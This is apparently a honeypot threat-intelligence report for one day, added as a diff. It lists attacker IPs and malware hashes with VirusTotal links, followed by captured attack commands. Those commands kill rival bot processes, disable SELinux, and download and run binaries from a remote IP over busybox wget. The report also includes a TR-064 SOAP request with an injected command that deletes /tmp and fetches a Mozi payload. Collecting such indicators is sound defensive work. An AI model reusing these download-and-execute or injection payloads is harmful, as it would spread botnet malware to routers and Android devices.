@@ -1,0 +1,62 @@
+Top 5 IPs for 18-10-2024 :
+
+75.111.120.123	
+121.43.239.184
+91.231.203.91
+124.118.20.147
+3.88.61.145
+
+Malware Observed:
+
+File name : sshd
+47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c
+https://www.virustotal.com/gui/file/47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c
+ 
+File name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+File name : sshd
+b2020e2debd2ed3c81345ea75bcdc91b650f1608bc9cbdba6f566dcba6e3afa3
+https://www.virustotal.com/gui/file/b2020e2debd2ed3c81345ea75bcdc91b650f1608bc9cbdba6f566dcba6e3afa3
+
+340c8464c2007ce3f80682e15dfafa4180b641d53c14201b929906b7b0284d87
+https://www.virustotal.com/gui/file/340c8464c2007ce3f80682e15dfafa4180b641d53c14201b929906b7b0284d87
+
+
+a049df7b58b1f52f9f2f74bef29ec994d955e8cbaeab9d6e76dadc1763fdfc52
+https://www.virustotal.com/gui/file/a049df7b58b1f52f9f2f74bef29ec994d955e8cbaeab9d6e76dadc1763fdfc52
+
+
+Commands/exploits observed :
+
+pkill -f main_arm7
+pkill -f main_arm
+pkill -f main_x86
+pkill -f main_x86_64
+su 0 pkill -f main_arm7
+su 0 pkill -f main_arm
+su 0 pkill -f main_x86
+su 0 pkill -f main_x86_64
+su 0 setenforce 0
+su 0 busybox wget http://212.64.199.171/a -O /data/local/tmp/a; su 0 chmod +x /data/local/tmp/a && su 0 sh /data/local/tmp/a
+busybox wget http://212.64.199.171/a; chmod 777 a;sh a
+busybox wget http://212.64.199.171/main_arm; chmod 777 main_arm; ./main_arm android.exploit
+busybox wget http://212.64.199.171/main_arm5; chmod 777 main_arm5; ./main_arm5 android.exploit
+busybox wget http://212.64.199.171/main_arm6; chmod 777 main_arm6; ./main_arm6 android.exploit
+busybox wget http://212.64.199.171/main_arm7; chmod 777 main_arm7; ./main_arm7 android.exploit
+busybox wget http://212.64.199.171/main_m68k; chmod 777 main_m68k; ./main_m68k android.exploit
+busybox wget http://212.64.199.171/main_mips; chmod 777 main_mips; ./main_mips android.exploit
+busybox wget http://212.64.199.171/main_mpsl; chmod 777 main_mpsl; ./main_mpsl android.exploit
+busybox wget http://212.64.199.171/main_ppc; chmod 777 main_ppc; ./main_ppc android.exploit
+busybox wget http://212.64.199.171/main_sh
+
+
+POST /UD/act?1 HTTP/1.1
+Host: 127.0.0.1:5555
+User-Agent: Hello, world
+SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
+Content-Type: text/xml
+Content-Length: 640
+
+<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://157.0.114.147:54733/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><NewNTPServer2>`echo DEATH`</NewNTPServer2><NewNTPServer3>`echo DEATH`</NewNTPServer3><NewNTPServer4>`echo DEATH`</NewNTPServer4><NewNTPServer5>`echo DEATH`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>
